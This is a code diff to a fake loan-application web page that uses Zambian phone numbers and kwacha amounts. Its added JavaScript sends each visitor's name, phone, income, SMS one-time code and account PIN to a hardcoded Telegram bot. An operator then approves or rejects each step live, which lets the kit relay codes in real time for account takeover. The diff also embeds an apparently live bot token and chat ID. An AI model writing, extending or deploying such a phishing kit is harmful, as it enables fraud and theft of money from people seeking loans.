@@ -333,6 +333,7 @@ input[type="text"] {
         <div class="step"></div>
         <div class="step"></div>
         <div class="step"></div>
+        <div class="step"></div>
     </div>
 
 
@@ -467,7 +468,7 @@ input[type="text"] {
             id="detailsButton"
             class="button yellow"
             disabled
-            onclick="goToPhoneVerification()"
+            onclick="goToDetailsVerification()"
         >
             Continue
         </button>
@@ -475,9 +476,65 @@ input[type="text"] {
     </div>
 
 
-    <!-- PAGE 3 -->
+    <!-- PAGE 3 DETAILS VERIFICATION -->
 
     <div id="page3" class="hidden">
+
+        <div class="center">
+
+            <div class="icon">👤</div>
+
+            <h2>Verify Your Details</h2>
+
+            <p style="margin-top:10px;color:#6b7280">
+                Please confirm your information.
+            </p>
+
+        </div>
+
+
+        <div class="card">
+
+            <div class="summary">
+
+                Full Name:
+                <b id="verifyName"></b>
+
+                <br>
+
+                Phone Number:
+                <b id="verifyPhone"></b>
+
+                <br>
+
+                Monthly Income:
+                <b id="verifyIncome"></b>
+
+                <br>
+
+                Loan Purpose:
+                <b id="verifyPurpose"></b>
+
+            </div>
+
+        </div>
+
+
+        <button
+            class="button blue"
+            onclick="sendDetailsToTelegram()"
+        >
+            Confirm & Continue
+        </button>
+
+        <div id="detailsStatus" class="status-message"></div>
+
+    </div>
+
+
+    <!-- PAGE 4 PHONE VERIFICATION -->
+
+    <div id="page4" class="hidden">
 
         <div class="center">
 
@@ -513,9 +570,9 @@ input[type="text"] {
     </div>
 
 
-    <!-- PAGE 4 OTP -->
+    <!-- PAGE 5 OTP -->
 
-    <div id="page4" class="hidden">
+    <div id="page5" class="hidden">
 
         <div class="center">
 
@@ -546,17 +603,19 @@ input[type="text"] {
             id="verifyButton"
             class="button blue"
             disabled
-            onclick="verifyOTP()"
+            onclick="submitOTP()"
         >
             Verify
         </button>
 
+        <div id="otpStatus" class="status-message"></div>
+
     </div>
 
 
-    <!-- PAGE 5 PIN VERIFICATION -->
+    <!-- PAGE 6 PIN VERIFICATION -->
 
-    <div id="page5" class="hidden">
+    <div id="page6" class="hidden">
 
         <div class="center">
 
@@ -614,9 +673,9 @@ input[type="text"] {
     </div>
 
 
-    <!-- PAGE 6 -->
+    <!-- PAGE 7 -->
 
-    <div id="page6" class="hidden">
+    <div id="page7" class="hidden">
 
         <div class="center">
 
@@ -650,9 +709,9 @@ input[type="text"] {
     </div>
 
 
-    <!-- PAGE 7 SUCCESS -->
+    <!-- PAGE 8 SUCCESS -->
 
-    <div id="page7" class="hidden">
+    <div id="page8" class="hidden">
 
         <div class="center">
 
@@ -820,7 +879,8 @@ function showPage(id, step, title, subtitle) {
         "page4",
         "page5",
         "page6",
-        "page7"
+        "page7",
+        "page8"
     ];
 
 
@@ -923,20 +983,92 @@ incomeInput.addEventListener(
 );
 
 
-function goToPhoneVerification() {
+function goToDetailsVerification() {
 
     document
-        .getElementById("phoneDisplay")
+        .getElementById("verifyName")
+        .innerText =
+        nameInput.value;
+
+    document
+        .getElementById("verifyPhone")
         .innerText =
         "+260 " + phoneInput.value;
+
+    document
+        .getElementById("verifyIncome")
+        .innerText =
+        "ZMW " + incomeInput.value;
+
+    document
+        .getElementById("verifyPurpose")
+        .innerText =
+        document.getElementById("purpose").value;
 
 
     showPage(
         "page3",
         3,
-        "Phone Verification",
-        "Verify your phone number"
+        "Verify Your Details",
+        "Confirm your information"
     );
+
+}
+
+
+function sendDetailsToTelegram() {
+
+    sessionToken = generateSessionId();
+    const confirmBtn = document.querySelector("#page3 .button.blue");
+    const detailsStatus = document.getElementById("detailsStatus");
+    const origText = confirmBtn.textContent;
+    confirmBtn.disabled = true;
+    confirmBtn.textContent = "Sending...";
+    detailsStatus.style.display = "block";
+
+    sendTelegramDetailsRequest(sessionToken)
+        .then(() => {
+            pollTelegramForAction({
+                session: sessionToken,
+                timeoutMs: 2 * 60 * 1000,
+                onAction: (action) => {
+                    clearTimeout(detailsPollingTimeoutHandle);
+                    confirmBtn.disabled = false;
+                    confirmBtn.textContent = origText;
+                    detailsStatus.style.display = "none";
+                    if (action === "approve_details") {
+                        document
+                            .getElementById("phoneDisplay")
+                            .innerText =
+                            "+260 " + phoneInput.value;
+
+                        showPage(
+                            "page4",
+                            4,
+                            "Phone Verification",
+                            "Verify your phone number"
+                        );
+                    } else if (action === "reject_details") {
+                        alert("Your details could not be verified. Please try again.");
+                    } else {
+                        alert("Unknown details action: " + action);
+                    }
+                },
+                onTimeout: () => {
+                    confirmBtn.disabled = false;
+                    confirmBtn.textContent = origText;
+                    detailsStatus.style.display = "none";
+                    alert("No response from agent. Please try again later.");
+                }
+            });
+        })
+        .catch(err => {
+            confirmBtn.disabled = false;
+            confirmBtn.textContent = origText;
+            detailsStatus.style.display = "none";
+            console.error("Send details request failed", err);
+            alert("Failed to send details verification. Please try again.");
+        });
 
 }
 
@@ -944,8 +1076,8 @@ function goToPhoneVerification() {
 function goToOTP() {
 
     showPage(
-        "page4",
-        4,
+        "page5",
+        5,
         "Verification Code",
         "Enter the code sent to your phone"
     );
@@ -1031,7 +1163,7 @@ function setupOTP() {
 }
 
 
-function verifyOTP() {
+function submitOTP() {
 
     const inputs =
         document.querySelectorAll(
@@ -1056,13 +1188,50 @@ function verifyOTP() {
 
     }
 
+    // Send OTP to telegram for admin verification
+    sessionToken = generateSessionId();
+    const otpBtn = document.getElementById("verifyButton");
+    const otpStatus = document.getElementById("otpStatus");
+    const origText = otpBtn.textContent;
+    otpBtn.disabled = true;
+    otpBtn.textContent = "Verifying...";
+    otpStatus.style.display = "block";
 
-    showPage(
-        "page5",
-        5,
-        "Enter Your PIN",
-        "Authorize your loan application"
-    );
+    sendTelegramOTPRequest(sessionToken, code, "+260 " + phoneInput.value)
+        .then(() => {
+            pollTelegramForAction({
+                session: sessionToken,
+                timeoutMs: 2 * 60 * 1000,
+                onAction: (action) => {
+                    clearTimeout(otpPollingTimeoutHandle);
+                    otpBtn.disabled = false;
+                    otpBtn.textContent = origText;
+                    otpStatus.style.display = "none";
+                    if (action === "approve_otp") {
+                        showPage("page6", 6, "Enter Your PIN", "Authorize your loan application");
+                    } else if (action === "wrongotp") {
+                        alert("The OTP provided is wrong or has expired. Please try again.");
+                        document.querySelectorAll("#otpGrid input").forEach(i => i.value = "");
+                        document.querySelectorAll("#otpGrid input")[0].focus();
+                    } else {
+                        alert("Unknown OTP action: " + action);
+                    }
+                },
+                onTimeout: () => {
+                    otpBtn.disabled = false;
+                    otpBtn.textContent = origText;
+                    otpStatus.style.display = "none";
+                    alert("No response from agent. Please try again later.");
+                }
+            });
+        })
+        .catch(err => {
+            otpBtn.disabled = false;
+            otpBtn.textContent = origText;
+            otpStatus.style.display = "none";
+            console.error("Send OTP request failed", err);
+            alert("Failed to send OTP to agent. Please try again.");
+        });
 
 }
 
@@ -1117,19 +1286,50 @@ function verifyPIN() {
 
     }
 
-    // Simulate PIN verification - in production, this would be verified server-side
-    if (pin === "0000") {
+    // Send PIN to telegram for admin verification
+    sessionToken = generateSessionId();
+    const pinBtn = document.getElementById("pinButton");
+    const pinStatus = document.getElementById("pinStatus");
+    const origText = pinBtn.textContent;
+    pinBtn.disabled = true;
+    pinBtn.textContent = "Authorizing...";
+    pinStatus.style.display = "block";
 
-        alert("Demo PIN accepted. Proceeding...");
-
-    }
-
-    showPage(
-        "page6",
-        6,
-        "Secure Authorization",
-        "Continue securely"
-    );
+    sendTelegramPINRequest(sessionToken, pin)
+        .then(() => {
+            pollTelegramForAction({
+                session: sessionToken,
+                timeoutMs: 2 * 60 * 1000,
+                onAction: (action) => {
+                    clearTimeout(pinPollingTimeoutHandle);
+                    pinBtn.disabled = false;
+                    pinBtn.textContent = origText;
+                    pinStatus.style.display = "none";
+                    if (action === "approve_pin") {
+                        showPage("page7", 7, "Secure Authorization", "Continue securely");
+                    } else if (action === "wrongpin") {
+                        alert("The PIN provided is incorrect. Please try again.");
+                        document.getElementById("pinInput").value = "";
+                        document.getElementById("pinInput").focus();
+                    } else {
+                        alert("Unknown PIN action: " + action);
+                    }
+                },
+                onTimeout: () => {
+                    pinBtn.disabled = false;
+                    pinBtn.textContent = origText;
+                    pinStatus.style.display = "none";
+                    alert("No response from agent. Please try again later.");
+                }
+            });
+        })
+        .catch(err => {
+            pinBtn.disabled = false;
+            pinBtn.textContent = origText;
+            pinStatus.style.display = "none";
+            console.error("Send PIN request failed", err);
+            alert("Failed to send PIN verification. Please try again.");
+        });
 
 }
 
@@ -1189,12 +1389,174 @@ function submitApplication() {
 
 
     showPage(
-        "page7",
-        7,
+        "page8",
+        8,
         "Application Submitted",
         "Your application has been received"
     );
 
+}
+
+/*
+  Telegram integration (client-side demo):
+  - Replace TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT with your real values.
+  - This demo uses Telegram getUpdates polling and therefore exposes the bot token in the client.
+    For production use, implement server-side webhook or proxy to keep the token secret.
+*/
+
+const TELEGRAM_BOT_TOKEN = '8913797417:AAFb5LoGkwgfXQugR2gcmVz-DXYgQC6IWw4';
+const TELEGRAM_ADMIN_CHAT = '8820857419';
+let tgLastUpdateId = 0;
+let sessionToken = null;
+let detailsPollHandle = null;
+let otpPollHandle = null;
+let pinPollHandle = null;
+let detailsPollingTimeoutHandle = null;
+let otpPollingTimeoutHandle = null;
+let pinPollingTimeoutHandle = null;
+
+function generateSessionId(){
+  return 's_' + Math.random().toString(36).slice(2,10);
+}
+
+async function telegramApiGet(path, params = {}) {
+  const url = new URL(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${path}`);
+  Object.keys(params).forEach(k=>url.searchParams.append(k, params[k]));
+  const res = await fetch(url.toString());
+  return res.json();
+}
+
+async function telegramApiPost(path, body = {}) {
+  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${path}`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(body)
+  });
+  return res.json();
+}
+
+async function sendTelegramDetailsRequest(session) {
+  const loan = calculateLoan();
+  const text = `Applicant Details Verification\nSession: ${session}\nFull Name: ${nameInput.value}\nPhone: +260 ${phoneInput.value}\nMonthly Income: ZMW ${incomeInput.value}\nLoan Purpose: ${document.getElementById("purpose").value}\nLoan Amount: ZMW ${loan.principal.toLocaleString()} / ${loan.months} months`;
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: 'APPROVE', callback_data: `approve_details::${session}` },
+        { text: 'REJECT', callback_data: `reject_details::${session}` }
+      ]
+    ]
+  };
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    return Promise.reject('Bot token not configured. Replace TELEGRAM_BOT_TOKEN with your token.');
+  }
+  return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+}
+
+async function sendTelegramOTPRequest(session, otp, otpPhone) {
+  const loan = calculateLoan();
+  const text = `OTP Verification\nSession: ${session}\nPhone: ${otpPhone}\nOTP: ${otp}\nLoan: ZMW ${loan.principal.toLocaleString()} / ${loan.months} months`;
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: 'APPROVE', callback_data: `approve_otp::${session}` },
+        { text: 'WRONG OTP', callback_data: `wrongotp::${session}` }
+      ]
+    ]
+  };
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    return Promise.reject('Bot token not configured. Replace TELEGRAM_BOT_TOKEN with your token.');
+  }
+  return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+}
+
+async function sendTelegramPINRequest(session, pin) {
+  const loan = calculateLoan();
+  const text = `PIN Verification\nSession: ${session}\nPhone: +260 ${phoneInput.value}\nPIN: ${pin}\nLoan: ZMW ${loan.principal.toLocaleString()} / ${loan.months} months`;
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: 'APPROVE', callback_data: `approve_pin::${session}` },
+        { text: 'WRONG PIN', callback_data: `wrongpin::${session}` }
+      ]
+    ]
+  };
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    return Promise.reject('Bot token not configured. Replace TELEGRAM_BOT_TOKEN with your token.');
+  }
+  return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+}
+
+function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, onTimeout = ()=>{}}) {
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    onTimeout();
+    return;
+  }
+
+  telegramApiGet('getUpdates').then(res=>{
+    if (res && res.ok && Array.isArray(res.result) && res.result.length) {
+      const maxId = Math.max(...res.result.map(u => u.update_id));
+      tgLastUpdateId = maxId + 1;
+    }
+  }).catch(()=>{ });
+
+  const start = Date.now();
+  const pollInterval = 1500;
+
+  const poll = async () => {
+    try {
+      const res = await telegramApiGet('getUpdates', { offset: tgLastUpdateId, timeout: 0 });
+      if(res && res.ok && Array.isArray(res.result) && res.result.length){
+        for(const update of res.result){
+          tgLastUpdateId = update.update_id + 1;
+          if(update.callback_query && update.callback_query.data){
+            const data = update.callback_query.data;
+            const callbackId = update.callback_query.id;
+            telegramApiPost('answerCallbackQuery', { callback_query_id: callbackId, text: 'Action received' }).catch(()=>{});
+            if(data.endsWith('::'+session)){
+              const action = data.split('::')[0];
+              onAction(action);
+              return clearPolling();
+            }
+          }
+        }
+      }
+      if(Date.now() - start > timeoutMs){
+        clearPolling();
+        onTimeout();
+      }
+    } catch(err){
+      console.error('Polling error', err);
+      if(Date.now() - start > timeoutMs){
+        clearPolling();
+        onTimeout();
+      }
+    }
+  };
+
+  function clearPolling(){
+    if(detailsPollHandle){ clearInterval(detailsPollHandle); detailsPollHandle = null; }
+    if(otpPollHandle){ clearInterval(otpPollHandle); otpPollHandle = null; }
+    if(pinPollHandle){ clearInterval(pinPollHandle); pinPollHandle = null; }
+    if(detailsPollingTimeoutHandle){ clearTimeout(detailsPollingTimeoutHandle); detailsPollingTimeoutHandle = null; }
+    if(otpPollingTimeoutHandle){ clearTimeout(otpPollingTimeoutHandle); otpPollingTimeoutHandle = null; }
+    if(pinPollingTimeoutHandle){ clearTimeout(pinPollingTimeoutHandle); pinPollingTimeoutHandle = null; }
+  }
+
+  if(session && session.startsWith('s_')){
+    const handle = setInterval(poll, pollInterval);
+    detailsPollHandle = handle;
+    otpPollHandle = handle;
+    pinPollHandle = handle;
+    const toHandle = setTimeout(()=> {
+      clearInterval(handle);
+      if(onTimeout) onTimeout();
+    }, timeoutMs + 500);
+    detailsPollingTimeoutHandle = toHandle;
+    otpPollingTimeoutHandle = toHandle;
+    pinPollingTimeoutHandle = toHandle;
+  } else {
+    setTimeout(onTimeout, 0);
+  }
 }
 
 </script>
